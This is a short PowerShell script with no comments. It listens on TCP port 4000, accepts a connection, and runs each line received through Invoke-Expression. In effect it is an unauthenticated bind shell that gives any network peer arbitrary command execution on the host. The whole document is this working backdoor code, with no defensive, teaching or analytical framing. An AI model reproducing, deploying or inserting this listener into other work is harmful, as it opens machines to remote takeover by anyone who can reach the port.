$Listner = [System.Net.Sockets.TcpListener]::new(4000)
$Listner.Start()

$Client = $Listner.AcceptTcpClient()
$Stream = $Client.GetStream()
$StreamReader = [System.IO.StreamReader]::new($Stream)

while( $true ) {
    if( -not $Client.Connected ){
        $Listner.Stop()
        $Listner.Server.Dispose()
        break
    }
    if( $Stream.DataAvailable ){
       Invoke-Expression $StreamReader.ReadLine()
    }
    Start-Sleep -Seconds 1
}


trap{
    $Listner.Stop()
    $Listner.Server.Dispose()
}